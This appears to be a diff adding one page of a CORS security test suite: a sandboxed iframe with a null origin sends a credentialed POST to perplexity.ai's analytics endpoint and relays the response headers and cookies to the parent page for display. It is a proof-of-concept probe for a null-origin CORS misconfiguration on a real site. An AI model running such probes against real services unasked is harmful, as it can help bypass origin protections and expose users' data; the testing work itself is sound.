@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test 1: Null Origin</title>
+</head>
+<body>
+    <h2>Null Origin Test</h2>
+    <div id="result"></div>
+
+    <iframe sandbox="allow-scripts allow-forms" srcdoc="
+        <script>
+        function sendRequest() {
+            fetch('https://perplexity.ai/cdn-cgi/rum', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    'eventType': 1,
+                    'memory': {
+                        'totalJSHeapSize': 11401845,
+                        'usedJSHeapSize': 7164829
+                    }
+                })
+            })
+            .then(response => {
+                window.parent.postMessage({
+                    status: response.status,
+                    headers: [...response.headers].toString(),
+                    cookies: document.cookie
+                }, '*');
+            })
+            .catch(error => {
+                window.parent.postMessage({
+                    error: error.toString()
+                }, '*');
+            });
+        }
+        sendRequest();
+        </script>
+    "></iframe>
+
+    <script>
+        window.addEventListener('message', function(e) {
+            document.getElementById('result').innerHTML = `
+                <pre>
+                ${JSON.stringify(e.data, null, 2)}
+                </pre>
+            `;
+        });
+    </script>
+    <br>
+    <a href="index.html">Back to Main</a>
+</body>
+</html>
